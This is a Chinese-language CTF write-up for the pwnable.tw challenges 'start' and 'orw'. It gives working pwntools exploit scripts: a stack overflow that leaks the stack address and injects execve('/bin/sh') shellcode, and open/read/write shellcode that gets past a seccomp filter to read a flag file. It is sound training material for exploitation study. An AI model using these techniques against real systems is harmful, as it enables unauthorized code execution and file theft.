一、start

首先进行保护检查，保护全关

然后用IDA分析一下：

采用了两个系统调用，其具体功能如下：

%rax System call %rdi %rsi %rdx %r10
3 sys_read unsigned int fd char *buf size_t count
4 sys_write unsigned int fd const char *buf size_t count

dl这个寄存器是控制输入字符的多少的，也就是所我们可以输入0x3c个字符，即read(1,esp,0x3c)

程序的基本功能为：

  • exit 压栈
  • write 字符串 “Let’s start the CTF:”
  • 向 esp 位置read 0x3c 大小的串

程序保护全关，我们可以试试shellcode，那么我们就必须要知道栈的地址

可以看到ret返回时esp和exit的距离为0x14，则我们只需溢出0x14字节，20字节后覆盖ret，24字节后覆盖esp。

则我们可以利用.text:08048087 mov ecx, esp ; addr将esp的地址打印出来

此外注意返回时ret_addr=esp+0x14

则最后的exp为：

from pwn import*
p=remote("chall.pwnable.tw",10000)
#p=process('./start')
payload='a'*0x14+p32(0x08048087)
p.sendafter("Let's start the CTF:",payload)
esp_addr=u32(p.recv(4))
shellcode="\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
payload1='a'*0x14+p32(esp_addr+0x14)+shellcode
p.send(payload1)
p.interactive()

二、orw

题目信息：

Read the flag from /home/orw/flag.

Only open read write syscall are allowed to use.

先进行保护检查：

IDA分析

int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}

unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  char *v2; // [esp+8h] [ebp-80h]
  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}

int prctl ( int option,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )

这个系统调用指令是为进程制定而设计的

我们可以通过seccomp-tools这个工具看看它限制了哪些系统调⽤

如题目描述一样，只能执行open、read、write三种函数，则我们可以利用以上三个函数将flag打印出来。

这三个函数的系统调用如下：

%rax System call eax ebx ecx edx
3 sys_read unsigned int fd char *buf size_t count
4 sys_write unsigned int fd const char *buf size_t count
5 sys_open const char __user *filename int flagsumode_t mode umode_t mode

exp为：

from pwn import *

#p = process('./orw')
p = remote('chall.pwnable.tw',10001)
p.recvuntil('Give my your shellcode:')
#open
shellcode = shellcraft.open('/home/orw/flag')
#read
shellcode += shellcraft.read(3,'esp',0x40)
#write
shellcode += shellcraft.write(1,'esp',0x40)
shellcode=asm(shellcode)
p.sendline(shellcode)
p.interactive()
